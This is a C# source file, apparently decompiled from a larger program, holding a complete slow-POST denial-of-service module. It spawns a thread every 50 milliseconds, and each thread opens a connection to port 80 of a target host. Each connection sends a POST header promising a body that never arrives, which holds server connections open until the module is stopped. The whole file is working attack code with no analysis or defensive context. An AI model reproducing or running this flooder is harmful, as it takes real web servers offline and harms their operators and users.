using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

internal sealed class Class5
{
	private sealed class Class6
	{
		public List<TcpClient> list_0;

		public void method_0()
		{
			TcpClient tcpClient = new TcpClient();
			list_0.Add(tcpClient);
			try
			{
				tcpClient.Connect(string_0, 80);
				StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
				streamWriter.Write("POST / HTTP/1.1\r\nHost: " + string_0 + "\r\nContent-length: 5235\r\n\r\n");
				streamWriter.Flush();
			}
			catch (Exception)
			{
			}
		}
	}

	public static Thread thread_0;

	public static string string_0;

	public static bool bool_0;

	public static void smethod_0()
	{
		bool_0 = true;
		thread_0 = new Thread(smethod_2);
		thread_0.Start();
	}

	public static void smethod_1()
	{
		bool_0 = false;
		thread_0.Abort();
	}

	public static void smethod_2()
	{
		Class6 @class = new Class6();
		@class.list_0 = new List<TcpClient>();
		while (bool_0)
		{
			new Thread(@class.method_0).Start();
			Thread.Sleep(50);
		}
		foreach (TcpClient item in @class.list_0)
		{
			try
			{
				item.GetStream().Dispose();
			}
			catch (Exception)
			{
			}
		}
	}
}
